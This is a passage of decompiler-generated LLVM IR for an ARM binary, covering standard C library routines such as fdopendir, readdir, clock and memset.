  %v3_10d80 = load i16, i16* @global_var_21510.336, align 2
  %v4_10d80 = sext i16 %v3_10d80 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_10d88 = add i32 %v4_10d80, %v0_10d7c
  %v4_10d88 = inttoptr i32 %v3_10d88 to i32*
  store i32 12, i32* %v4_10d88, align 4
  %v0_10d8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d8c

dec_label_pc_10d8c:                               ; preds = %dec_label_pc_10d48, %dec_label_pc_10d40, %dec_label_pc_10d6c
  %v0_10d8c = phi i32 [ %v2_10d60, %dec_label_pc_10d48 ], [ 0, %dec_label_pc_10d40 ], [ %v0_10d8c.pre, %dec_label_pc_10d6c ]
  store i32 %v3_10ce4, i32* @r7, align 4
  ret i32 %v0_10d8c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10d8c, { 2, 0, 1 }
}

define i32 @"$d.9"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10d9c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_10d9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10d9c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10d9c
  store i32 %arg1, i32* %arg2, align 4
  %v5_10da0 = load i32, i32* @ip, align 4
  %v6_10da0 = load i32, i32* %r1.global-to-local, align 4
  %v7_10da0 = sub i32 %v6_10da0, %v5_10da0
  store i32 %v7_10da0, i32* %r1.global-to-local, align 4
  %v2_10da4 = load i32, i32* @r8, align 4
  %v5_10da4 = mul i32 %v2_10da4, 32768
  %v6_10da4 = and i32 %v5_10da4, %v7_10da0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10d9c, %bb
  %v7_10da4 = phi i32 [ %arg1, %dec_label_pc_10d9c ], [ %v6_10da4, %bb ]
  ret i32 %v7_10da4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_10dac = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10dac, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_10db8 = call i32 @fstat()
  store i32 %v0_10db8, i32* @r5, align 4
  %v2_10dbc = icmp eq i32 %v0_10db8, 0
  br i1 %v2_10dbc, label %dec_label_pc_10dc4, label %dec_label_pc_10e3c

dec_label_pc_10dc4:                               ; preds = %entry
  %v1_10dc8 = and i32 %tmp4, 61440
  store i32 %v1_10dc8, i32* @r3, align 4
  %v7_10dcc = icmp eq i32 %v1_10dc8, 16384
  br i1 %v7_10dcc, label %dec_label_pc_10dec, label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10dc4
  %v0_10dd8 = call i32 @__aeabi_read_tp()
  %v3_10ddc = load i16, i16* @global_var_21510.336, align 2
  %v0_10de0 = load i32, i32* @r5, align 4
  store i32 %v0_10de0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e20

dec_label_pc_10dec:                               ; preds = %dec_label_pc_10dc4
  %v0_10dec = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_10df4 = call i32 @__libc_fcntl(i32 %v0_10dec, i32 3)
  %v7_10df8 = icmp eq i32 %v2_10df4, -1
  br i1 %v7_10df8, label %dec_label_pc_10e3c, label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10dec
  %v1_10e00 = urem i32 %v2_10df4, 4
  store i32 %v1_10e00, i32* %r3.global-to-local, align 4
  %v7_10e04 = icmp eq i32 %v1_10e00, 1
  br i1 %v7_10e04, label %dec_label_pc_10e0c, label %dec_label_pc_10e28

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10e00
  %v0_10e10 = call i32 @__aeabi_read_tp()
  %v3_10e14 = load i16, i16* @global_var_21510.336, align 2
  %v0_10e18 = load i32, i32* @r5, align 4
  store i32 %v0_10e18, i32* %r1.global-to-local, align 4
  %v0_10e1c = load i32, i32* %r3.global-to-local, align 4
  %v1_10e1c = add i32 %v0_10e1c, 21
  br label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10dd4, %dec_label_pc_10e0c
  %v2_10e20.in = phi i16 [ %v3_10ddc, %dec_label_pc_10dd4 ], [ %v3_10e14, %dec_label_pc_10e0c ]
  %v1_10e20 = phi i32 [ %v0_10dd8, %dec_label_pc_10dd4 ], [ %v0_10e10, %dec_label_pc_10e0c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_10dd4 ], [ %v1_10e1c, %dec_label_pc_10e0c ]
  %v2_10e20 = sext i16 %v2_10e20.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_10e20 = add i32 %v1_10e20, %v2_10e20
  %v4_10e20 = inttoptr i32 %v3_10e20 to i32*
  store i32 %storemerge, i32* %v4_10e20, align 4
  %v0_10e40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e40

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e00
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_10e2c = load i32, i32* @r4, align 4
  %v2_10e30 = call i32 @fd_to_DIR(i32 %v0_10e2c, i32 %tmp)
  store i32 %v2_10e30, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e40

dec_label_pc_10e3c:                               ; preds = %entry, %dec_label_pc_10dec
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e28, %dec_label_pc_10e20, %dec_label_pc_10e3c
  %v0_10e40 = phi i32 [ %v2_10e30, %dec_label_pc_10e28 ], [ %v0_10e40.pre, %dec_label_pc_10e20 ], [ 0, %dec_label_pc_10e3c ]
  ret i32 %v0_10e40

; uselistorder directives
  uselistorder i32 %v1_10e00, { 1, 0 }
  uselistorder i32 %v2_10df4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 5, 0, 6, 7, 4, 1, 8, 2, 9, 3, 10 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_10e40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10e20, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10e58 = load i32, i32* @r4, align 4
  %v6_10e58 = load i32, i32* @r5, align 4
  %v9_10e58 = load i32, i32* @r6, align 4
  %v12_10e58 = load i32, i32* @r7, align 4
  %v15_10e58 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r6, align 4
  %v1_10e6c = add i32 %tmp, 24
  store i32 %v1_10e6c, i32* @r4, align 4
  %v4_10e70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 68) to i32*), align 4
  store i32 %v4_10e70, i32* %r1.global-to-local, align 4
  store i32 %v1_10e6c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_10e84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10e84)
  %v0_10e98 = load i32, i32* @r6, align 4
  %v2_10e98 = add i32 %v0_10e98, 16
  %v3_10e98 = inttoptr i32 %v2_10e98 to i32*
  %v4_10e98 = load i32, i32* %v3_10e98, align 4
  store i32 %v4_10e98, i32* @ip, align 4
  store i32 69284, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10e98)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10ed8, %entry
  %v0_10ea8 = load i32, i32* @r5, align 4
  %v1_10ea8 = add i32 %v0_10ea8, 4
  %v2_10ea8 = inttoptr i32 %v1_10ea8 to i32*
  %v3_10ea8 = load i32, i32* %v2_10ea8, align 4
  store i32 %v3_10ea8, i32* %r2.global-to-local, align 4
  %v4_10ea8 = add i32 %v0_10ea8, 8
  %v5_10ea8 = inttoptr i32 %v4_10ea8 to i32*
  %v6_10ea8 = load i32, i32* %v5_10ea8, align 4
  %tmp10 = icmp ugt i32 %v6_10ea8, %v3_10ea8
  br i1 %tmp10, label %dec_label_pc_10ed8, label %dec_label_pc_10eb4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10ea8
  %v1_10eb4 = inttoptr i32 %v0_10ea8 to i32*
  %v2_10eb4 = load i32, i32* %v1_10eb4, align 4
  %v1_10eb8 = add i32 %v0_10ea8, 12
  %v2_10eb8 = inttoptr i32 %v1_10eb8 to i32*
  %v3_10eb8 = load i32, i32* %v2_10eb8, align 4
  store i32 %v3_10eb8, i32* %r1.global-to-local, align 4
  %v1_10ebc = add i32 %v0_10ea8, 20
  %v2_10ebc = inttoptr i32 %v1_10ebc to i32*
  %v3_10ebc = load i32, i32* %v2_10ebc, align 4
  store i32 %v3_10ebc, i32* %r2.global-to-local, align 4
  %v4_10ec0 = call i32 @__getdents(i32 %v2_10eb4, i32 %v3_10eb8, i32 %v3_10ebc, i32 %v6_10ea8)
  %tmp9 = icmp slt i32 %v4_10ec0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_10ed0

.thread:                                          ; preds = %dec_label_pc_10eb4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10f04

dec_label_pc_10ed0:                               ; preds = %dec_label_pc_10eb4
  %v1_10ed0 = load i32, i32* @r5, align 4
  %v2_10ed0 = add i32 %v1_10ed0, 8
  %v3_10ed0 = inttoptr i32 %v2_10ed0 to i32*
  store i32 %v4_10ec0, i32* %v3_10ed0, align 4
  %v0_10ed4 = load i32, i32* @r7, align 4
  %v1_10ed4 = load i32, i32* @r5, align 4
  %v2_10ed4 = add i32 %v1_10ed4, 4
  %v3_10ed4 = inttoptr i32 %v2_10ed4 to i32*
  store i32 %v0_10ed4, i32* %v3_10ed4, align 4
  %v0_10ed8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10ed8

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10ea8, %dec_label_pc_10ed0
  %v1_10ee8 = phi i32 [ %v0_10ea8, %dec_label_pc_10ea8 ], [ %v0_10ed8.pre, %dec_label_pc_10ed0 ]
  %v1_10ed8 = add i32 %v1_10ee8, 4
  %v2_10ed8 = inttoptr i32 %v1_10ed8 to i32*
  %v3_10ed8 = load i32, i32* %v2_10ed8, align 4
  store i32 %v3_10ed8, i32* %r2.global-to-local, align 4
  %v1_10edc = add i32 %v1_10ee8, 12
  %v2_10edc = inttoptr i32 %v1_10edc to i32*
  %v3_10edc = load i32, i32* %v2_10edc, align 4
  store i32 %v3_10edc, i32* %r1.global-to-local, align 4
  %v2_10ee0 = add i32 %v3_10edc, %v3_10ed8
  store i32 %v2_10ee0, i32* @r4, align 4
  %v1_10ee4 = add i32 %v2_10ee0, 4
  %v2_10ee4 = inttoptr i32 %v1_10ee4 to i32*
  %v3_10ee4 = load i32, i32* %v2_10ee4, align 4
  %v2_10ee8 = add i32 %v1_10ee8, 16
  %v3_10ee8 = inttoptr i32 %v2_10ee8 to i32*
  store i32 %v3_10ee4, i32* %v3_10ee8, align 4
  %v0_10eec = load i32, i32* @r4, align 4
  %v1_10eec = add i32 %v0_10eec, 8
  %v2_10eec = inttoptr i32 %v1_10eec to i16*
  %v3_10eec = load i16, i16* %v2_10eec, align 2
  %v4_10eec = zext i16 %v3_10eec to i32
  %v0_10ef0 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ef0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ef0 = add i32 %v1_10ef0, %v0_10ef0
  %v3_10ef0 = inttoptr i32 %v2_10ef0 to i32*
  %v4_10ef0 = load i32, i32* %v3_10ef0, align 4
  store i32 %v4_10ef0, i32* %r1.global-to-local, align 4
  %v2_10ef4 = add i32 %v0_10ef0, %v4_10eec
  %v2_10ef8 = icmp eq i32 %v4_10ef0, 0
  %v1_10efc = load i32, i32* @r5, align 4
  %v2_10efc = add i32 %v1_10efc, 4
  %v3_10efc = inttoptr i32 %v2_10efc to i32*
  store i32 %v2_10ef4, i32* %v3_10efc, align 4
  br i1 %v2_10ef8, label %dec_label_pc_10ea8, label %dec_label_pc_10f04

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10ed8, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10f10 = load i32, i32* @r6, align 4
  %v2_10f10 = add i32 %v0_10f10, 44
  %v3_10f10 = inttoptr i32 %v2_10f10 to i32*
  %v4_10f10 = load i32, i32* %v3_10f10, align 4
  call void @__pseudo_branch(i32 %v4_10f10)
  %v0_10f1c = load i32, i32* @r4, align 4
  store i32 %v3_10e58, i32* @r4, align 4
  store i32 %v6_10e58, i32* @r5, align 4
  store i32 %v9_10e58, i32* @r6, align 4
  store i32 %v12_10e58, i32* @r7, align 4
  store i32 %v15_10e58, i32* @lr, align 4
  ret i32 %v0_10f1c

; uselistorder directives
  uselistorder i32 %v1_10ee8, { 0, 2, 1 }
  uselistorder i32 %v6_10ea8, { 1, 0 }
  uselistorder i32 %v0_10ea8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_10ed8, { 1, 0 }
}

define i32 @function_10f30(i32 %arg1) local_unnamed_addr {
dec_label_pc_10f30:
  %v0_10f30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10f30, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10f30
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10f30, %bb
  %v4_10f3c = phi i32 [ %arg1, %dec_label_pc_10f30 ], [ 0, %bb ]
  ret i32 %v4_10f3c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_10f40 = load i32, i32* @lr, align 4
  %v0_10f48 = call i32 @__aeabi_read_tp()
  %v3_10f4c = load i16, i16* @global_var_21510.336, align 2
  %v4_10f4c = sext i16 %v3_10f4c to i32
  %v2_10f50 = add i32 %v4_10f4c, %v0_10f48
  store i32 %v0_10f40, i32* @lr, align 4
  ret i32 %v2_10f50
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_10f64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10f64, i32* @r0, align 4
  %v1_10f6c = call i32 @times(i32 %v2_10f64)
  %v2_10f70 = load i32, i32* %stack_var_-24, align 4
  %v2_10f74 = add i32 %v2_10f70, %tmp
  %v2_10f7c = mul i32 %v2_10f74, 10000
  %v1_10f80 = and i32 %v2_10f7c, 2147483632
  ret i32 %v1_10f80

; uselistorder directives
  uselistorder i32 %v2_10f64, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_10fa0 = call i32 @_memcpy()
  ret i32 %v0_10fa0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_10fb0 = call i32 @_memcpy()
  ret i32 %v0_10fb0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_10fc4 = icmp eq i32 %arg3, 8
  store i1 %v8_10fc4, i1* %cpsr_z.global-to-local, align 1
  %v5_10fc8 = icmp slt i32 %arg3, 8
  br i1 %v5_10fc8, label %dec_label_pc_11028, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %entry
  %v4_10fcc = mul i32 %arg2, 256
  %v5_10fcc = or i32 %v4_10fcc, %arg2
  %v4_10fd0 = mul i32 %v5_10fcc, 65536
  %v5_10fd0 = or i32 %v4_10fd0, %v5_10fcc
  store i32 %v5_10fd0, i32* @r1, align 4
  %v1_10fd457 = urem i32 %tmp, 4
  %v2_10fd458 = icmp eq i32 %v1_10fd457, 0
  store i1 %v2_10fd458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_10fd458, label %dec_label_pc_10fe4, label %bb

bb:                                               ; preds = %dec_label_pc_10fcc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_10fcc ]
  %v3_10fd859 = phi i32 [ %v6_10fd8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_10fcc ]
  %v4_10fd8 = inttoptr i32 %v3_10fd859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_10fd8, align 1
  %v5_10fd8 = load i32, i32* @r3, align 4
  %v6_10fd8 = add i32 %v5_10fd8, 1
  store i32 %v6_10fd8, i32* @r3, align 4
  %v0_10fdc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_10fe8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_10fdc.pr, label %dec_label_pc_10fe4, label %.thread

.thread:                                          ; preds = %bb
  %v2_10fdc = add i32 %v0_10fe8.pr.pre, -1
  store i32 %v2_10fdc, i32* %r2.global-to-local, align 4
  %v1_10fd4 = urem i32 %v6_10fd8, 4
  %v2_10fd4 = icmp eq i32 %v1_10fd4, 0
  store i1 %v2_10fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fd4, label %dec_label_pc_10fe4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_10fd8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_10fd8.pre to i8
  br label %bb

dec_label_pc_10fe4:                               ; preds = %.thread, %bb, %dec_label_pc_10fcc
  %v0_10ff028 = phi i32 [ %tmp, %dec_label_pc_10fcc ], [ %v6_10fd8, %bb ], [ %v6_10fd8, %.thread ]
  %v0_10fe8.pr = phi i32 [ %arg3, %dec_label_pc_10fcc ], [ %v0_10fe8.pr.pre, %bb ], [ %v2_10fdc, %.thread ]
  %v0_10fe4 = load i32, i32* @r1, align 4
  store i32 %v0_10fe4, i32* %ip.global-to-local, align 4
  %v8_10fe810 = icmp eq i32 %v0_10fe8.pr, 8
  store i1 %v8_10fe810, i1* %cpsr_z.global-to-local, align 1
  %v5_10fec11 = icmp slt i32 %v0_10fe8.pr, 8
  br i1 %v5_10fec11, label %dec_label_pc_11028, label %dec_label_pc_10ff0.preheader

dec_label_pc_10ff0.preheader:                     ; preds = %dec_label_pc_10fe4
  %v1_10ff046 = inttoptr i32 %v0_10ff028 to i32*
  store i32 %v0_10fe4, i32* %v1_10ff046, align 4
  %v3_10ff047 = add i32 %v0_10ff028, 4
  %v4_10ff048 = inttoptr i32 %v3_10ff047 to i32*
  %v5_10ff049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_10ff049, i32* %v4_10ff048, align 4
  %v6_10ff050 = add i32 %v0_10ff028, 8
  store i32 %v6_10ff050, i32* @r3, align 4
  %v0_10ff451 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ff452 = add i32 %v0_10ff451, -8
  store i32 %v1_10ff452, i32* %r2.global-to-local, align 4
  %v5_10ffc53 = icmp slt i32 %v1_10ff452, 8
  br i1 %v5_10ffc53, label %dec_label_pc_10ff0.dec_label_pc_11028.loopexit_crit_edge, label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %dec_label_pc_10ff0.preheader, %dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge
  %v6_10ff055 = phi i32 [ %v6_10ff0, %dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge ], [ %v6_10ff050, %dec_label_pc_10ff0.preheader ]
  %v0_10ff054 = phi i32 [ %v12_1101c, %dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge ], [ %v0_10ff028, %dec_label_pc_10ff0.preheader ]
  %v1_11000 = inttoptr i32 %v6_10ff055 to i32*
  %v2_11000 = load i32, i32* @r1, align 4
  store i32 %v2_11000, i32* %v1_11000, align 4
  %v3_11000 = add i32 %v0_10ff054, 12
  %v4_11000 = inttoptr i32 %v3_11000 to i32*
  %v5_11000 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11000, i32* %v4_11000, align 4
  %v6_11000 = add i32 %v0_10ff054, 16
  store i32 %v6_11000, i32* @r3, align 4
  %v0_11004 = load i32, i32* %r2.global-to-local, align 4
  %v1_11004 = add i32 %v0_11004, -8
  store i32 %v1_11004, i32* %r2.global-to-local, align 4
  %v5_1100c = icmp slt i32 %v1_11004, 8
  br i1 %v5_1100c, label %dec_label_pc_11000.dec_label_pc_11028.loopexit_crit_edge, label %dec_label_pc_11010

dec_label_pc_11010:                               ; preds = %dec_label_pc_11000
  %v1_11010 = inttoptr i32 %v6_11000 to i32*
  %v2_11010 = load i32, i32* @r1, align 4
  store i32 %v2_11010, i32* %v1_11010, align 4
  %v3_11010 = add i32 %v0_10ff054, 20
  %v4_11010 = inttoptr i32 %v3_11010 to i32*
  %v5_11010 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11010, i32* %v4_11010, align 4
  %v6_11010 = add i32 %v0_10ff054, 24
  store i32 %v6_11010, i32* @r3, align 4
  %v0_11014 = load i32, i32* %r2.global-to-local, align 4
  %v1_11014 = add i32 %v0_11014, -8
  store i32 %v1_11014, i32* %r2.global-to-local, align 4
  %v5_1101c = icmp slt i32 %v1_11014, 8
  br i1 %v5_1101c, label %dec_label_pc_11010.dec_label_pc_11028.loopexit_crit_edge, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %dec_label_pc_11010
  %v7_1101c = inttoptr i32 %v6_11010 to i32*
  %v8_1101c = load i32, i32* @r1, align 4
  store i32 %v8_1101c, i32* %v7_1101c, align 4
  %v9_1101c = add i32 %v0_10ff054, 28
  %v10_1101c = inttoptr i32 %v9_1101c to i32*
  %v11_1101c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1101c, i32* %v10_1101c, align 4
  %v12_1101c = add i32 %v0_10ff054, 32
  store i32 %v12_1101c, i32* @r3, align 4
  %v6_11020 = load i32, i32* %r2.global-to-local, align 4
  %v7_11020 = add i32 %v6_11020, -8
  store i32 %v7_11020, i32* %r2.global-to-local, align 4
  %v5_10fec = icmp slt i32 %v7_11020, 8
  br i1 %v5_10fec, label %dec_label_pc_10fe8.dec_label_pc_11028.loopexit_crit_edge, label %dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge

dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge:  ; preds = %dec_label_pc_10fe8
  %v2_10ff0.pre = load i32, i32* @r1, align 4
  %v1_10ff0 = inttoptr i32 %v12_1101c to i32*
  store i32 %v2_10ff0.pre, i32* %v1_10ff0, align 4
  %v3_10ff0 = add i32 %v0_10ff054, 36
  %v4_10ff0 = inttoptr i32 %v3_10ff0 to i32*
  %v5_10ff0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_10ff0, i32* %v4_10ff0, align 4
  %v6_10ff0 = add i32 %v0_10ff054, 40
  store i32 %v6_10ff0, i32* @r3, align 4
  %v0_10ff4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ff4 = add i32 %v0_10ff4, -8
  store i32 %v1_10ff4, i32* %r2.global-to-local, align 4
  %v5_10ffc = icmp slt i32 %v1_10ff4, 8
  br i1 %v5_10ffc, label %dec_label_pc_10ff0.dec_label_pc_11028.loopexit_crit_edge, label %dec_label_pc_11000

dec_label_pc_10fe8.dec_label_pc_11028.loopexit_crit_edge: ; preds = %dec_label_pc_10fe8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11028

dec_label_pc_10ff0.dec_label_pc_11028.loopexit_crit_edge: ; preds = %dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge, %dec_label_pc_10ff0.preheader
  %v1_10ff4.lcssa = phi i32 [ %v1_10ff452, %dec_label_pc_10ff0.preheader ], [ %v1_10ff4, %dec_label_pc_10fe8.dec_label_pc_10ff0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11028

dec_label_pc_11000.dec_label_pc_11028.loopexit_crit_edge: ; preds = %dec_label_pc_11000
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11028

dec_label_pc_11010.dec_label_pc_11028.loopexit_crit_edge: ; preds = %dec_label_pc_11010
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %dec_label_pc_10fe4, %dec_label_pc_10fe8.dec_label_pc_11028.loopexit_crit_edge, %dec_label_pc_10ff0.dec_label_pc_11028.loopexit_crit_edge, %dec_label_pc_11000.dec_label_pc_11028.loopexit_crit_edge, %dec_label_pc_11010.dec_label_pc_11028.loopexit_crit_edge, %entry
  %v0_11030 = phi i32 [ %arg3, %entry ], [ %v1_11014, %dec_label_pc_11010.dec_label_pc_11028.loopexit_crit_edge ], [ %v1_11004, %dec_label_pc_11000.dec_label_pc_11028.loopexit_crit_edge ], [ %v1_10ff4.lcssa, %dec_label_pc_10ff0.dec_label_pc_11028.loopexit_crit_edge ], [ %v7_11020, %dec_label_pc_10fe8.dec_label_pc_11028.loopexit_crit_edge ], [ %v0_10fe8.pr, %dec_label_pc_10fe4 ]
  %v2_11028 = icmp eq i32 %v0_11030, 0
  store i1 %v2_11028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11028, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11028
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11028
  %v1_11030 = sub i32 7, %v0_11030
  store i32 %v1_11030, i32* %r2.global-to-local, align 4
  %v3_11034 = mul i32 %v1_11030, 4
  %v4_11034 = add i32 %v3_11034, ptrtoint (i32* @global_var_1103c.381 to i32)
  call void @__pseudo_branch(i32 %v4_11034)
  %v0_1103c = load i32, i32* @r1, align 4
  %v1_1103c = trunc i32 %v0_1103c to i8
  %v2_1103c = load i32, i32* @r3, align 4
  %v3_1103c = inttoptr i32 %v2_1103c to i8*
  store i8 %v1_1103c, i8* %v3_1103c, align 1
  %v4_1103c = load i32, i32* @r3, align 4
  %v5_1103c = add i32 %v4_1103c, 1
  store i32 %v5_1103c, i32* %r3.global-to-local, align 4
  %v0_11040 = load i32, i32* @r1, align 4
  %v1_11040 = trunc i32 %v0_11040 to i8
  %v3_11040 = inttoptr i32 %v5_1103c to i8*
  store i8 %v1_11040, i8* %v3_11040, align 1
  %v4_11040 = load i32, i32* %r3.global-to-local, align 4
  %v5_11040 = add i32 %v4_11040, 1
  store i32 %v5_11040, i32* %r3.global-to-local, align 4
  %v0_11044 = load i32, i32* @r1, align 4
  %v1_11044 = trunc i32 %v0_11044 to i8
  %v3_11044 = inttoptr i32 %v5_11040 to i8*
  store i8 %v1_11044, i8* %v3_11044, align 1
  %v4_11044 = load i32, i32* %r3.global-to-local, align 4
  %v5_11044 = add i32 %v4_11044, 1
  store i32 %v5_11044, i32* %r3.global-to-local, align 4
  %v0_11048 = load i32, i32* @r1, align 4
  %v1_11048 = trunc i32 %v0_11048 to i8
  %v3_11048 = inttoptr i32 %v5_11044 to i8*
  store i8 %v1_11048, i8* %v3_11048, align 1
  %v4_11048 = load i32, i32* %r3.global-to-local, align 4
  %v5_11048 = add i32 %v4_11048, 1
  store i32 %v5_11048, i32* %r3.global-to-local, align 4
  %v0_1104c = load i32, i32* @r1, align 4
  %v1_1104c = trunc i32 %v0_1104c to i8
  %v3_1104c = inttoptr i32 %v5_11048 to i8*
  store i8 %v1_1104c, i8* %v3_1104c, align 1
  %v4_1104c = load i32, i32* %r3.global-to-local, align 4
  %v5_1104c = add i32 %v4_1104c, 1
  store i32 %v5_1104c, i32* %r3.global-to-local, align 4
  %v0_11050 = load i32, i32* @r1, align 4
  %v1_11050 = trunc i32 %v0_11050 to i8
  %v3_11050 = inttoptr i32 %v5_1104c to i8*
  store i8 %v1_11050, i8* %v3_11050, align 1
  %v4_11050 = load i32, i32* %r3.global-to-local, align 4
  %v5_11050 = add i32 %v4_11050, 1
  store i32 %v5_11050, i32* %r3.global-to-local, align 4
  %v0_11054 = load i32, i32* @r1, align 4
  %v1_11054 = trunc i32 %v0_11054 to i8
